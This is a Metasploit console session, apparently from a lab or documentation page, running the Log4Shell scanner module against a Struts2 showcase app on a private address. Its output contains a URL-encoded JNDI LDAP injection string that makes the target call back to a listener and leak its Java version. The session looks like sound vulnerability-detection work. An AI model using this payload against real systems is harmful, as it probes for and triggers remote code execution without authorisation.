```bash
msf6 > use auxiliary/scanner/http/log4shell_scanner 
msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.159.128
SRVHOST => 192.168.159.128
msf6 auxiliary(scanner/http/log4shell_scanner) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/log4shell_scanner) > set TARGETURI /struts2-showcase/
TARGETURI => /struts2-showcase/
msf6 auxiliary(scanner/http/log4shell_scanner) > run
[*] Started service listener on 192.168.159.128:389 
[+] Log4Shell found via /struts2-showcase/%24%7bjndi%3aldap%3a%24%7b%3a%3a-/%7d/192.168.159.128%3a389/r7yol50kgg7be/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d/ (java: BellSoft_11.0.13)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/log4shell_scanner) >
```

